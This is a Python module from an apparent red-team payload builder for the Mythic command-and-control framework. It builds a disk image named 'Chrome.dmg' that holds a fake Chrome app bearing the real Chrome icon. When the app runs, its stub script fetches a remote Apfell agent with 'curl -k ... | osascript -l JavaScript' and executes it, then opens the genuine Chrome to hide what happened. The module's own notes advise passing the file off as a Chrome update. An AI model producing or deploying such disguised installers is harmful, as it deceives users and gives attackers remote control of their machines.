### Resources
# https://arunpatwardhan.com/2019/01/04/creating-your-own-drag-and-drop-dmg/
# https://www.fcvl.net/vulnerabilities/macosx-gatekeeper-bypass
# https://asmaloney.com/2013/07/howto/packaging-a-mac-os-x-application-using-a-dmg/
# https://www.recitalsoftware.com/blogs/148-howto-build-a-dmg-file-from-the-command-line-on-mac-os-x

### This method relies on https://github.com/al45tair/dmgbuild but can build a basic one doing:
# 1) hdiutil create /tmp/tmp.dmg -ov -volname "TestDMG" -fs HFS+ -srcfolder "/Users/itsatrap/Desktop/Test/"
# 2) hdiutil convert /tmp/tmp.dmg -format UDZO -o TestDMG.dmg
# I used dmgbuild because I like simple pretty graphics :)

import os
import asyncio
import dmgbuild
from .Utilities import *


def dmg():
    temp = "./Templates/DMG/"
    payload = "./Payloads/DMG_Payload"
    print("!!! This module currently assumes Chrome is installed in /Applications on the build machine")

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Disk Image",
                                           filename="Disk_Image.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            print("[*] Building DMG Package Payload")
            payload_info = await get_payload_data(mythic_instance=mythic_instance, payload_uuid=resp["uuid"])
            copyanything("./Templates/DMG/Chrome.app", payload + "/Chrome.app")
            shutil.copyfile("/Applications/Google Chrome.app/Contents/Resources/app.icns",
                            payload + "/Chrome.app/Contents/Resources/AutomatorApplet.icns")
            url = await get_payload_download_url(payload_info)
            chromefile = open(payload + "/Chrome.app/Contents/MacOS/Application Stub", 'w')
            chromefile.write('#!/bin/bash\n')
            chromefile.write("curl -k %s | osascript -l JavaScript &" % url)
            chromefile.write("\n")
            chromefile.write('open -a "Google Chrome"\n')
            os.system("chmod +x " + payload + "/Chrome.app/Contents/MacOS/Application\ Stub")
        else:
            print(f"[-] Failed to build payload: {resp['error']}")

    async def main():
        await scripting()
        os.chdir(payload)
        dmgbuild.build_dmg('chrome.dmg', 'Chrome App', 'settings.json')
        print("[+] Built Disk Image as Chrome.dmg")
        print("Notes: \n"
              "1) The created dmg file acts best as an update to a legitimate app (Chrome by default) \n"
              "2) Payload execution does not occur until the user runs the application (not just installation)")

    asyncio.run(main())
